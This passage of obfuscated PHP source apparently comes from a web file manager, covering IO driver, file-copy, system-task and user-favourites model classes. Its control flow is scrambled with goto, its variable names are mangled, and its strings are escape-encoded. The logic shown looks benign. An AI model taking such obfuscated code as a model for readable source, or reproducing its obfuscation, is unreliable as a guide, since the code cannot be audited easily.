$b¶õˆˆÕ, $dÂÀ‘ô«ø©, $FÑÕÏÈ†Îô, $CÁîñ›Š«); return $CÁîñ›Š«; goto BÚÉ»²âğä; b™Ï´Å¹­¯: mk_dir($c†¶êŠ¢¡‚); $dŠ×áåÖÄ = $c†¶êŠ¢¡‚ . $C…Ë‹ìÂŠ¹; $dŠ×áåÖÄ = $bøÔÌ§è¿Ã->download($a ¹¸°¥„¹, $dŠ×áåÖÄ); goto cºŞº©¼¨; CÎ‘µìÏÑƒ: $B†‡’˜ù =& $_SERVER[Ìó]; $dÂÀ‘ô«ø© = $b¶õˆˆÕ->getPath(rtrim($dÂÀ‘ô«ø©, $B†‡’˜ù[8]) . $B†‡’˜ù[8] . $FÑÕÏÈ†Îô); $C…Ë‹ìÂŠ¹ = $B†‡’˜ù[999] . time() . rand_string(5); goto D£ë›‚ÍäÜ; BÚÉ»²âğä: } public static function pathFather($Cñ¥Å’„¸) { $b ÍÜ½îÎ = IO::init($Cñ¥Å’„¸); $FÙ¿œ¡´‡ = $b ÍÜ½îÎ->pathFather($b ÍÜ½îÎ->path); return $b ÍÜ½îÎ->getPathOuter($FÙ¿œ¡´‡); } public static function fileOut($fáÉ½˜Æƒ, $E² ¦œœ½ = false, $e¶Êƒ•ƒá‹ = false, $C¶¼ê¯ƒ¹• = '') { $FŒ§Ñƒ± = self::driverMake($fáÉ½˜Æƒ); if ($FŒ§Ñƒ±->isFileOutServer()) { return $FŒ§Ñƒ±->fileOutServer($fáÉ½˜Æƒ, $E² ¦œœ½, $e¶Êƒ•ƒá‹, $C¶¼ê¯ƒ¹•); } return $FŒ§Ñƒ±->fileOut($fáÉ½˜Æƒ, $E² ¦œœ½, $e¶Êƒ•ƒá‹, $C¶¼ê¯ƒ¹•); } public static function fileOutImage($a‰µˆ—îŞ, $Eïí¢•©¬è = 250) { $eƒ‰Šæ¼îğ = array(250, 600, 1200, 3000); for ($dŞÜŒ÷•§¹ = 0; $dŞÜŒ÷•§¹ < count($eƒ‰Šæ¼îğ); $dŞÜŒ÷•§¹++) { if ($dŞÜŒ÷•§¹ == 0 && $Eïí¢•©¬è <= $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹]) { $Eïí¢•©¬è = $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹]; break; } else { if ($Eïí¢•©¬è > $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹ - 1] && $Eïí¢•©¬è <= $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹]) { $Eïí¢•©¬è = $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹]; break; } else { if ($dŞÜŒ÷•§¹ == count($eƒ‰Šæ¼îğ) - 1 && $Eïí¢•©¬è > $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹]) { $Eïí¢•©¬è = $eƒ‰Šæ¼îğ[$dŞÜŒ÷•§¹]; break; } } } } $DáË×ÊÖÜš = self::driverMake($a‰µˆ—îŞ); if ($DáË×ÊÖÜš->isFileOutServer()) { return $DáË×ÊÖÜš->fileOutImageServer($a‰µˆ—îŞ, $Eïí¢•©¬è); } return $DáË×ÊÖÜš->fileOutImage($a‰µˆ—îŞ, $Eïí¢•©¬è); } private static function driverIsSame($Fõ³ÓÚ‘´, $A‚†›õ°ÌÌ) { goto Fƒ†Ò°Ô; aÎã¶—×ˆ: if ($BÚÃÕõ‡ëÖ != $Cø«Ïïã•µ) { return !1; } if ($BÚÃÕõ‡ëÖ == $Dõ×øÍìœ[690]) { return !0; } if ($BÚÃÕõ‡ëÖ == $Dõ×øÍìœ[101]) { return !0; } goto C­¾Åø’ï¡; Fƒ†Ò°Ô: $Dõ×øÍìœ =& $_SERVER[Ìó]; $BÚÃÕõ‡ëÖ = $Fõ³ÓÚ‘´->getType(); $Cø«Ïïã•µ = $A‚†›õ°ÌÌ->getType(); goto aÎã¶—×ˆ; C­¾Åø’ï¡: if ($Fõ³ÓÚ‘´->pathDriver == $A‚†›õ°ÌÌ->pathDriver) { return !0; } return !1; goto F³§×Ö„‚‹; F³§×Ö„‚‹: } public static function copyUpdate($Då˜‰ÏØò, $bÙƒ¸…‰äÉ) { goto AŠ·Ñµ‚†Ó; a£œÔ‰–ˆ¶: $fŒÍ‡„ÜÅ = array(); foreach ($aŒì‡¯ñ²´ as $e«Å·ñ™°¨ => $b¦¤ºõ†„Ë) { if (isset($fóŠäñèã¼[$e«Å·ñ™°¨])) { if ($b¦¤ºõ†„Ë[$BÌ­Ë×”[76]] == 1) { continue; } if ($fóŠäñèã¼[$e«Å·ñ™°¨][$BÌ­Ë×”[77]] == $b¦¤ºõ†„Ë[$BÌ­Ë×”[77]]) { continue; } } if ($b¦¤ºõ†„Ë[$BÌ­Ë×”[76]] == 1) { $fŒÍ‡„ÜÅ[] = $bÙƒ¸…‰äÉ . $BÌ­Ë×”[8] . $e«Å·ñ™°¨; continue; } $EÄ‡Ü•¶Ë = strstr(trim($e«Å·ñ™°¨, $BÌ­Ë×”[8]), $BÌ­Ë×”[8]) ? get_path_father($e«Å·ñ™°¨) : $BÌ­Ë×”[33]; $AŠ£…¡½æÊ[] = array($BÌ­Ë×”[1002] => $b¦¤ºõ†„Ë[$BÌ­Ë×”[75]], $BÌ­Ë×”[1003] => rtrim($bÙƒ¸…‰äÉ, $BÌ­Ë×”[8]) . $BÌ­Ë×”[8] . $EÄ‡Ü•¶Ë, $BÌ­Ë×”[1004] => $b¦¤ºõ†„Ë); } $DÓ†Ó™»¦ = array($BÌ­Ë×”[163] => $AŠ£…¡½æÊ, $BÌ­Ë×”[76] => $fŒÍ‡„ÜÅ); goto C‘Íªå†±µ; C‘Íªå†±µ: Hook::trigger($BÌ­Ë×”[1005], $Då˜‰ÏØò, $bÙƒ¸…‰äÉ, $DÓ†Ó™»¦); foreach ($fŒÍ‡„ÜÅ as $b¦¤ºõ†„Ë) { IO::mkdir($b¦¤ºõ†„Ë); } foreach ($AŠ£…¡½æÊ as $b¦¤ºõ†„Ë) { IO::copy($b¦¤ºõ†„Ë[$BÌ­Ë×”[1002]], $b¦¤ºõ†„Ë[$BÌ­Ë×”[1003]], REPEAT_REPLACE); } goto bµ·çš–†‡; C•ëÙ˜: $aŒì‡¯ñ²´ = self::_listAll($Då˜‰ÏØò); $fóŠäñèã¼ = self::_listAll($bÙƒ¸…‰äÉ); $AŠ£…¡½æÊ = array(); goto a£œÔ‰–ˆ¶; AŠ·Ñµ‚†Ó: $BÌ­Ë×” =& $_SERVER[Ìó]; if (!IO::exist($Då˜‰ÏØò)) { return !1; } if (!IO::exist($bÙƒ¸…‰äÉ)) { IO::mkdir($bÙƒ¸…‰äÉ); } goto C•ëÙ˜; bµ·çš–†‡: } private static function _listAll($FİÙ÷Ü†”) { $e¾æéÎÄİƒ =& $_SERVER[Ìó]; $FİÙ÷Ü†” = KodIO::clear($FİÙ÷Ü†”); $Cˆµ­ˆä­¾ = IO::listAll($FİÙ÷Ü†”); foreach ($Cˆµ­ˆä­¾ as &$d‚å»ÒË¬³) { $C—¦Å—ˆà¡ = substr($d‚å»ÒË¬³[$e¾æéÎÄİƒ[75]], strlen($FİÙ÷Ü†”)); $d‚å»ÒË¬³[$e¾æéÎÄİƒ[1006]] = trim($C—¦Å—ˆà¡, $e¾æéÎÄİƒ[8]); } return array_to_keyvalue($Cˆµ­ˆä­¾, $e¾æéÎÄİƒ[1006]); } public static function fileSubstr($fÙ·¬æ‰ƒ›, $B‘–´ïëôÀ, $eÀ«¦áõ†Œ = false) { goto a¢íº³ÏöĞ; C³¼ĞÓÙ×¡: return $A‰Õ´ö¤Ç->fileSubstr($fÙ·¬æ‰ƒ›, $B‘–´ïëôÀ, $eÀ«¦áõ†Œ); goto Bé©¸¼ùÒ; cˆË°›È²ä: $F²‹Çæ’Ù– = $eÀ«¦áõ†Œ; if ($B‘–´ïëôÀ < 0) { $B‘–´ïëôÀ = $aßÚÌ¸¬® + $B‘–´ïëôÀ; } if ($eÀ«¦áõ†Œ === !1) { $eÀ«¦áõ†Œ = $aßÚÌ¸¬® - $B‘–´ïëôÀ; } goto dÒìˆ±¥Øâ; dÒìˆ±¥Øâ: if ($B‘–´ïëôÀ + $eÀ«¦áõ†Œ > $aßÚÌ¸¬®) { $eÀ«¦áõ†Œ = $aßÚÌ¸¬® - $B‘–´ïëôÀ; } if ($eÀ«¦áõ†Œ <= 0) { return $_SERVER[Ìó][33]; } if ($B‘–´ïëôÀ < 0 || $B‘–´ïëôÀ >= $aßÚÌ¸¬® || $eÀ«¦áõ†Œ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\122\x65\141\x64\40\x65\162\162\x6f\x72\x21\x20\163\x74\141\x72\164\75{$B‘–´ïëôÀ}\73\x6c\145\156\147\164\150\75{$eÀ«¦áõ†Œ}\x3b\40\x73\151\x7a\145\x3d{$aßÚÌ¸¬®}\73"); } goto C³¼ĞÓÙ×¡; a¢íº³ÏöĞ: $A‰Õ´ö¤Ç = self::driverMake($fÙ·¬æ‰ƒ›); $aßÚÌ¸¬® = $A‰Õ´ö¤Ç->size($fÙ·¬æ‰ƒ›); $C‹ó‡œ±ÄÎ = $B‘–´ïëôÀ; goto cˆË°›È²ä; Bé©¸¼ùÒ: } private static function driverMake(&$DÑ‚áÖó¾) { goto eöŒÃæİ‰; EòÃĞ¶ó: if ($EÛ×£Ú¿´–[$dóËİ’õî­[29]] == KodIO::KOD_IO && !self::$driverListSystem[$EÛ×£Ú¿´–[$dóËİ’õî­[363]]]) { return !1; } $DÑ‚áÖó¾ = $EÛ×£Ú¿´–[$dóËİ’õî­[1007]]; $Cğà²ñ´™Â = self::driverGet($EÛ×£Ú¿´–, $DÑ‚áÖó¾); goto cç›ƒ…¼ÔÕ; eöŒÃæİ‰: $dóËİ’õî­ =& $_SERVER[Ìó]; $EÛ×£Ú¿´– = KodIO::parse($DÑ‚áÖó¾); if (!self::$driverListSystem) { $dğè‡Èå¨Ï = Model($dóËİ’õî­[700])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dğè‡Èå¨Ï, $dóËİ’õî­[363]); } goto EòÃĞ¶ó; cç›ƒ…¼ÔÕ: return $Cğà²ñ´™Â; goto fÉŞÊ£Î‹‰; fÉŞÊ£Î‹‰: } private static function driverGet($B­Ö¡ËÃ‚¹, &$cÂ¾Ö·É¦¬) { goto DÆåôÆÅòŠ; DÆåôÆÅòŠ: $CÆ«ÊŞ÷Üğ =& $_SERVER[Ìó]; $d‘ˆˆ±–æ = $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[1008]]; $c‡Ã†™«¿­ = $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[363]]; goto eâ¦Üê¤¡; bÖ”¹¡ò¼: $fÈ±–âä²— = self::$driverCache[$dë´’–‚µî]; $fÈ±–âä²—->pathDriver = $d‘ˆˆ±–æ; $fÈ±–âä²—->pathBase = $CÆ«ÊŞ÷Üğ[33]; goto e‚Œ×³‘ê; eâ¦Üê¤¡: switch ($B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[29]]) { case KodIO::KOD_IO: $cåóĞÊë = self::$driverListSystem[$c‡Ã†™«¿­]; break; case KodIO::KOD_SOURCE: $cÂ¾Ö·É¦¬ = $c‡Ã†™«¿­ . $cÂ¾Ö·É¦¬; $cåóĞÊë = array($CÆ«ÊŞ÷Üğ[1009] => $CÆ«ÊŞ÷Üğ[1010], $CÆ«ÊŞ÷Üğ[6] => $B­Ö¡ËÃ‚¹); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bô¥²’¸‘ = $GLOBALS[$CÆ«ÊŞ÷Üğ[1011]]; self::$driverListUser = array_to_keyvalue($bô¥²’¸‘, $CÆ«ÊŞ÷Üğ[363]); } $cåóĞÊë = self::$driverListUser[$c‡Ã†™«¿­]; break; case KodIO::KOD_SHARE_LINK: $cåóĞÊë = array($CÆ«ÊŞ÷Üğ[1009] => $CÆ«ÊŞ÷Üğ[1012], $CÆ«ÊŞ÷Üğ[6] => $B­Ö¡ËÃ‚¹); $dÓ®ëÒÇÁ = Action($CÆ«ÊŞ÷Üğ[1013])->sharePathInfo($B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[75]]); $cÂ¾Ö·É¦¬ = $dÓ®ëÒÇÁ[$CÆ«ÊŞ÷Üğ[365]]; if (!$dÓ®ëÒÇÁ[$CÆ«ÊŞ÷Üğ[365]]) { $a­Ùî¨â¿ = Model($CÆ«ÊŞ÷Üğ[531])->getInfo($dÓ®ëÒÇÁ[$CÆ«ÊŞ÷Üğ[436]]); $cÂ¾Ö·É¦¬ = KodIO::clear($a­Ùî¨â¿[$CÆ«ÊŞ÷Üğ[1014]] . $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[1007]]); $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[434]] = $a­Ùî¨â¿; $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[994]] = $cÂ¾Ö·É¦¬; $cåóĞÊë = array($CÆ«ÊŞ÷Üğ[1009] => $CÆ«ÊŞ÷Üğ[1015], $CÆ«ÊŞ÷Üğ[6] => $B­Ö¡ËÃ‚¹); } break; case KodIO::KOD_SHARE_ITEM: $cåóĞÊë = array($CÆ«ÊŞ÷Üğ[1009] => $CÆ«ÊŞ÷Üğ[1016], $CÆ«ÊŞ÷Üğ[6] => $B­Ö¡ËÃ‚¹); $a­Ùî¨â¿ = Model($CÆ«ÊŞ÷Üğ[531])->getInfo($B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[363]]); if ($a­Ùî¨â¿[$CÆ«ÊŞ÷Üğ[365]] == $CÆ«ÊŞ÷Üğ[463]) { $cÂ¾Ö·É¦¬ = KodIO::clear($a­Ùî¨â¿[$CÆ«ÊŞ÷Üğ[1014]] . $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[1007]]); $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[434]] = $a­Ùî¨â¿; $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[994]] = $cÂ¾Ö·É¦¬; $cåóĞÊë = array($CÆ«ÊŞ÷Üğ[1009] => $CÆ«ÊŞ÷Üğ[1017], $CÆ«ÊŞ÷Üğ[6] => $B­Ö¡ËÃ‚¹); } break; default: $cÂ¾Ö·É¦¬ = $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[75]]; $cåóĞÊë = array($CÆ«ÊŞ÷Üğ[1009] => $CÆ«ÊŞ÷Üğ[1018]); break; } $dë´’–‚µî = $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[75]]; if (!isset(self::$driverCache[$dë´’–‚µî])) { $C¥¦çŠ¯² = strtolower($cåóĞÊë[$CÆ«ÊŞ÷Üğ[90]]); $BµÃÙéàµé = $GLOBALS[$CÆ«ÊŞ÷Üğ[6]][$CÆ«ÊŞ÷Üğ[84]][$CÆ«ÊŞ÷Üğ[1019]]; $C‹õõï†õ = $CÆ«ÊŞ÷Üğ[71] . (isset($BµÃÙéàµé[$C¥¦çŠ¯²]) ? $BµÃÙéàµé[$C¥¦çŠ¯²] : ucfirst($C¥¦çŠ¯²)); if (!class_exists($C‹õõï†õ)) { show_json("{$C‹õõï†õ}\40\156\157\x74\x20\x65\x78\151\x73\164\163\41", !1); } $EŠ–åñ¤…» = isset($cåóĞÊë[$CÆ«ÊŞ÷Üğ[6]]) ? $cåóĞÊë[$CÆ«ÊŞ÷Üğ[6]] : !1; self::$driverCache[$dë´’–‚µî] = new $C‹õõï†õ($EŠ–åñ¤…»); } goto bÖ”¹¡ò¼; e‚Œ×³‘ê: if (isset($cåóĞÊë[$CÆ«ÊŞ÷Üğ[6]][$CÆ«ÊŞ÷Üğ[1020]])) { $fÈ±–âä²—->pathBase = rtrim($cåóĞÊë[$CÆ«ÊŞ÷Üğ[6]][$CÆ«ÊŞ÷Üğ[1020]], $CÆ«ÊŞ÷Üğ[8]) . $CÆ«ÊŞ÷Üğ[8]; $cÂ¾Ö·É¦¬ = $fÈ±–âä²—->pathBase . ltrim($cÂ¾Ö·É¦¬, $CÆ«ÊŞ÷Üğ[8]); } $cÂ¾Ö·É¦¬ = $fÈ±–âä²—->getPath($cÂ¾Ö·É¦¬); if (isset($B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[994]])) { $cÂ¾Ö·É¦¬ = $B­Ö¡ËÃ‚¹[$CÆ«ÊŞ÷Üğ[994]]; } goto b™©äÀ…ù; b™©äÀ…ù: $fÈ±–âä²—->path = $cÂ¾Ö·É¦¬; return $fÈ±–âä²—; goto a£Ôºß‡ÙÃ; a£Ôºß‡ÙÃ: } } goto CäŒ á™¦; eÑ…ˆ‰¢Ï¶: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x74\x61\163\x6b\114\151\x73\164"; public $field = array("\156\141\155\x65", "\x74\x79\160\x65", "\145\x76\x65\156\164", "\x74\x69\155\145", "\x64\145\x73\143", "\163\x79\163\x74\x65\155", "\145\156\141\x62\x6c\145", "\154\141\163\x74\122\165\x6e", "\163\157\x72\164"); public function listData($eâÇÚ»•µ = false, $fÆ¦‘˜Š…î = "\163\157\162\x74", $EÎšÍÉ™“Å = false) { return parent::listData($eâÇÚ»•µ, $fÆ¦‘˜Š…î, $EÎšÍÉ™“Å); } public function add($ağª¢‘é«) { $eî¬äœ·Æœ =& $_SERVER[Ìó]; $a­—“½›„½ = $this->findByName($ağª¢‘é«[$eî¬äœ·Æœ[28]]); if ($a­—“½›„½) { return !1; } $ağª¢‘é«[$eî¬äœ·Æœ[1374]] = 0; $ağª¢‘é«[$eî¬äœ·Æœ[2093]] = $this->getSort(); return parent::insert($ağª¢‘é«); } private function getSort() { $eÜÀË®Ì´® =& $_SERVER[Ìó]; $d‡²é©ÛˆÑ = parent::listData(); $d¡¹­–ÃêĞ = array_to_keyvalue($d‡²é©ÛˆÑ, $eÜÀË®Ì´®[33], $eÜÀË®Ì´®[2093]); return empty($d¡¹­–ÃêĞ) ? 0 : max($d¡¹­–ÃêĞ) + 1; } public function update($Eœ’ÕËª…ˆ, $E÷‘Ø´®İã) { $a Ã¯‰Ã’ =& $_SERVER[Ìó]; $a‚‰¢º = $this->listData($Eœ’ÕËª…ˆ); $EœÇë¼‚ÌË = $this->findByName($E÷‘Ø´®İã[$a Ã¯‰Ã’[28]]); if (!$a‚‰¢º || $EœÇë¼‚ÌË && $EœÇë¼‚ÌË[$a Ã¯‰Ã’[363]] != $a‚‰¢º[$a Ã¯‰Ã’[363]]) { return !1; } return parent::update($Eœ’ÕËª…ˆ, $E÷‘Ø´®İã); } public function remove($BÏöŠ¤¨Ñ¨, $bôšåŒ©— = false) { $E’„ò×ÒòÄ =& $_SERVER[Ìó]; $fƒğ»‡ = $this->listData($BÏöŠ¤¨Ñ¨); if (!$fƒğ»‡) { return; } if (!$bôšåŒ©— && $fƒğ»‡[$E’„ò×ÒòÄ[1076]] == $E’„ò×ÒòÄ[83]) { return !1; } return parent::remove($BÏöŠ¤¨Ñ¨); } public function enable($F­«Åï±ö‡, $D§âÛğÈâˆ) { return $this->update($F­«Åï±ö‡, array($_SERVER[Ìó][2436] => $D§âÛğÈâˆ)); } public function run($c«äÃ÷Í“) { return $this->update($c«äÃ÷Í“, array($_SERVER[Ìó][2446] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Bˆ‡¦¢©’æ) { $f»±¦Š…˜÷ =& $_SERVER[Ìó]; return array($f»±¦Š…˜÷[2447] => array(USER_ID, $f»±¦Š…˜÷[2448])); } protected function listData() { $bòµòÈª˜‘ =& $_SERVER[Ìó]; $f¬•Í¿ºİ‘ = array($bòµòÈª˜‘[1400] => USER_ID, $bòµòÈª˜‘[431] => 0); $eÉ¼ˆìœ‘· = $bòµòÈª˜‘[2449]; $C½øĞçÛöÙ = $this->field($eÉ¼ˆìœ‘·)->where($f¬•Í¿ºİ‘)->order($bòµòÈª˜‘[2450])->select(); return $C½øĞçÛöÙ ? $C½øĞçÛöÙ : array(); } protected function resetCache() { } protected function listView() { goto A®»îŸ¡‹Ê; Aç¬Î¨²ˆ: $E±³¹ÃÕ‡ = array($eåŠ‹Ó¶‘ö[379] => array($eåŠ‹Ó¶‘ö[380], $B†Èô§é†Ñ)); $a¹åóöì‚Ü = Model($eåŠ‹Ó¶‘ö[748])->listSource($E±³¹ÃÕ‡, $FÈÅíï™Ò); $a¹åóöì‚Ü = array_merge($a¹åóöì‚Ü[$eåŠ‹Ó¶‘ö[73]], $a¹åóöì‚Ü[$eåŠ‹Ó¶‘ö[74]]); goto eß¹š¨‰ßÊ; A®»îŸ¡‹Ê: $eåŠ‹Ó¶‘ö =& $_SERVER[Ìó]; $dñÉŞ´‹¥á = $this->listData(); $C³Ø®¼éğ› = array_filter_by_field($dñÉŞ´‹¥á, $eåŠ‹Ó¶‘ö[29], $eåŠ‹Ó¶‘ö[378]); goto AòÎ¤‘¤É×; eß¹š¨‰ßÊ: $a¹åóöì‚Ü = array_to_keyvalue($a¹åóöì‚Ü, $eåŠ‹Ó¶‘ö[365]); foreach ($dñÉŞ´‹¥á as $bïÙñµØ‰Ñ => $Bâ˜¢õ‘ÜÓ) { $EŸ®Ëğ½õ¨ = $a¹åóöì‚Ü[$Bâ˜¢õ‘ÜÓ[$eåŠ‹Ó¶‘ö[75]]]; $EŸ®Ëğ½õ¨ = $EŸ®Ëğ½õ¨ ? $EŸ®Ëğ½õ¨ : array(); $dñÉŞ´‹¥á[$bïÙñµØ‰Ñ] = array_merge($EŸ®Ëğ½õ¨, $Bâ˜¢õ‘ÜÓ); } return $dñÉŞ´‹¥á; goto FÅÔ‰”¼ÛÍ; AòÎ¤‘¤É×: $B†Èô§é†Ñ = array_to_keyvalue($C³Ø®¼éğ›, $eåŠ‹Ó¶‘ö[33], $eåŠ‹Ó¶‘ö[75]); if (!$B†Èô§é†Ñ) { return $dñÉŞ´‹¥á; } $FÈÅíï™Ò = 2000; goto Aç¬Î¨²ˆ; FÅÔ‰”¼ÛÍ: } protected function addFav($CÈÊ¼¿Ù‹Ş, $Aİºæ†ÂÊ = '', $b”İ½èÁØĞ = "\163\157\x75\162\x63\x65") { goto DÍ÷Öõ‰¾†; BîŞ¸ïŞ‡Š: $aôÛêã”­ = array($E‹åŞ¹„âˆ[1400] => USER_ID, $E‹åŞ¹„âˆ[431] => 0); $A‡ÑØßÎ¾¹ = $this->where($aôÛêã”­)->max($E‹åŞ¹„âˆ[2093]); if (!$A‡ÑØßÎ¾¹) { $A‡ÑØßÎ¾¹ = 0; } goto E…™õ­ª‹; bİíˆô‰›ç: return $this->add($bš„®²š¨); goto FŠÔãò¶Š; E…™õ­ª‹: if (!$Aİºæ†ÂÊ && $b”İ½èÁØĞ == $E‹åŞ¹„âˆ[378]) { $aó”Ö’‰’ = Model($E‹åŞ¹„âˆ[1106])->where(array($E‹åŞ¹„âˆ[379] => $CÈÊ¼¿Ù‹Ş))->find(); if (!$aó”Ö’‰’) { return !1; } $Aİºæ†ÂÊ = $aó”Ö’‰’[$E‹åŞ¹„âˆ[28]]; } $Aİºæ†ÂÊ = $this->getAutoName($Aİºæ†ÂÊ); $bš„®²š¨ = array($E‹åŞ¹„âˆ[1400] => USER_ID, $E‹åŞ¹„âˆ[431] => 0, $E‹åŞ¹„âˆ[382] => $Aİºæ†ÂÊ, $E‹åŞ¹„âˆ[383] => $CÈÊ¼¿Ù‹Ş, $E‹åŞ¹„âˆ[384] => $b”İ½èÁØĞ, $E‹åŞ¹„âˆ[2076] => $A‡ÑØßÎ¾¹ + 1); goto bİíˆô‰›ç; DÍ÷Öõ‰¾†: $E‹åŞ¹„âˆ =& $_SERVER[Ìó]; $aôÛêã”­ = array($E‹åŞ¹„âˆ[1400] => USER_ID, $E‹åŞ¹„âˆ[431] => 0, $E‹åŞ¹„âˆ[384] => $b”İ½èÁØĞ, $E‹åŞ¹„âˆ[383] => $CÈÊ¼¿Ù‹Ş); if ($this->where($aôÛêã”­)->find()) { return !1; } goto BîŞ¸ïŞ‡Š; FŠÔãò¶Š: } protected function remove($EÖ‘ª©¬‚÷) { $FÌŠÓ³Á‘œ =& $_SERVER[Ìó]; $fçÈôåÉß = array($FÌŠÓ³Á‘œ[1400] => USER_ID, $FÌŠÓ³Á‘œ[381] => $EÖ‘ª©¬‚÷); return $this->where($fçÈôåÉß)->delete(); } protected function removeByName($b•É¥ˆ) { $aß°„ ÌÂ =& $_SERVER[Ìó]; $Eº†“¸š…ë = array($aß°„ ÌÂ[1400] => USER_ID, $aß°„ ÌÂ[382] => $b•É¥ˆ, $aß°„ ÌÂ[431] => 0); return $this->where($Eº†“¸š…ë)->delete(); } protected function rename($eá˜ÄšÓõé, $f†³Ù£¿»ô) { $b»ä¼Ø¢ŠŒ =& $_SERVER[Ìó]; if ($eá˜ÄšÓõé == $f†³Ù£¿»ô) { return !1; } $cª¯ÕÎéİí = $this->getAutoName($f†³Ù£¿»ô); if ($f†³Ù£¿»ô != $cª¯ÕÎéİí) { return !1; } $bˆàìåÉ² = array($b»ä¼Ø¢ŠŒ[1400] => USER_ID, $b»ä¼Ø¢ŠŒ[431] => 0, $b»ä¼Ø¢ŠŒ[28] => $eá˜ÄšÓõé); return $this->where($bˆàìåÉ²)->save(array($b»ä¼Ø¢ŠŒ[28] => $f†³Ù£¿»ô)); } protected function resetSort($F¦¢ÇáÇ®Ó) { $e˜äêÅÑ®µ =& $_SERVER[Ìó]; $F¦¢ÇáÇ®Ó = is_array($F¦¢ÇáÇ®Ó) ? $F¦¢ÇáÇ®Ó : array(); $A¬¤Õ¸ÀØÑ = array($e˜äêÅÑ®µ[1400] => USER_ID); for ($fä…éàéÎ = 0; $fä…éàéÎ < count($F¦¢ÇáÇ®Ó); $fä…éàéÎ++) { $A¬¤Õ¸ÀØÑ[$e˜äêÅÑ®µ[381]] = $F¦¢ÇáÇ®Ó[$fä…éàéÎ]; $this->where($A¬¤Õ¸ÀØÑ)->save(array($e˜äêÅÑ®µ[2076] => $fä…éàéÎ + 1)); } return !0; } protected function moveTop($eÚ‚‹šŸî) { goto BÑä·ª‚ËÃ; aÜ…Š˜ˆ–: return $this->resetSort($b‰ïÒĞ’ø·); goto FÇµ¸Ä‘ÖÚ; c–•ùÀ¼: $D‹—›…ŸÛ = $b‰ïÒĞ’ø·; $b‰ïÒĞ’ø· = array_remove_value($b‰ïÒĞ’ø·, $aóƒßîÅ[$fÜÓÚ¡ÍÑ¶[363]]); array_unshift($b‰ïÒĞ’ø·, $aóƒßîÅ[$fÜÓÚ¡ÍÑ¶[363]]); goto aÜ…Š˜ˆ–; BÑä·ª‚ËÃ: $fÜÓÚ¡ÍÑ¶ =& $_SERVER[Ìó]; $bŞñ°‰Â¸ = array($fÜÓÚ¡ÍÑ¶[1400] => USER_ID, $fÜÓÚ¡ÍÑ¶[431] => 0); $aóƒßîÅ = $this->where($bŞñ°‰Â¸)->where(array($fÜÓÚ¡ÍÑ¶[28] => $eÚ‚‹šŸî))->find(); goto Fô¦¡ªá¥õ; Fô¦¡ªá¥õ: if (!$aóƒßîÅ) { return; } $b‰ïÒĞ’ø· = $this->field($fÜÓÚ¡ÍÑ¶[363])->where($bŞñ°‰Â¸)->order($fÜÓÚ¡ÍÑ¶[2450])->select(); $b‰ïÒĞ’ø· = array_to_keyvalue($b‰ïÒĞ’ø·, $fÜÓÚ¡ÍÑ¶[33], $fÜÓÚ¡ÍÑ¶[363]); goto c–•ùÀ¼; FÇµ¸Ä‘ÖÚ: } protected function moveBottom($féœŠñ„øİ) { $d«©Ò¬“Ã =& $_SERVER[Ìó]; $D¥ĞëÁ´æ® = array($d«©Ò¬“Ã[1400] => USER_ID, $d«©Ò¬“Ã[431] => 0); $déâÕšñÆÔ = $this->where($D¥ĞëÁ´æ®)->max($d«©Ò¬“Ã[2093]); $CñÒ·¼ŠÛ§ = array($d«©Ò¬“Ã[2093] => $déâÕšñÆÔ + 1); return $this->where($D¥ĞëÁ´æ®)->where(array($d«©Ò¬“Ã[28] => $féœŠñ„øİ))->save($CñÒ·¼ŠÛ§); } private function getAutoName($AˆïÙ˜²ô) { goto cŠÇ¾±Ø—ß; CÏÏ¥ùíÊ­: $dÉÙ¸Ùù‚ = array_to_keyvalue($dÉÙ¸Ùù‚, $DôîØÚµö»[33], $DôîØÚµö»[28]); if (!$dÉÙ¸Ùù‚ || !in_array($AˆïÙ˜²ô, $dÉÙ¸Ùù‚)) { return $AˆïÙ˜²ô; } for ($E•Ñ¼Ä¿æê = 0; $E•Ñ¼Ä¿æê < count($dÉÙ¸Ùù‚); $E•Ñ¼Ä¿æê++) { if (!in_array($AˆïÙ˜²ô . "\50{$E•Ñ¼Ä¿æê}\x29", $dÉÙ¸Ùù‚)) { return $AˆïÙ˜²ô . "\50{$E•Ñ¼Ä¿æê}\x29"; } } goto CÑãõ‰­®“; CÑãõ‰­®“: return $AˆïÙ˜²ô . "\50{$E•Ñ¼Ä¿æê}\x29"; goto dá´ÜÛã°ã; cŠÇ¾±Ø—ß: $DôîØÚµö» =& $_SERVER[Ìó]; $c‘ç–«ˆÎ = array($DôîØÚµö»[1400] => USER_ID, $DôîØÚµö»[431] => 0); $dÉÙ¸Ùù‚ = $this->field($DôîØÚµö»[28])->where($c‘ç–«ˆÎ)->select(); goto CÏÏ¥ùíÊ­; dá´ÜÛã°ã: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\x6a\157\x62\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\145", 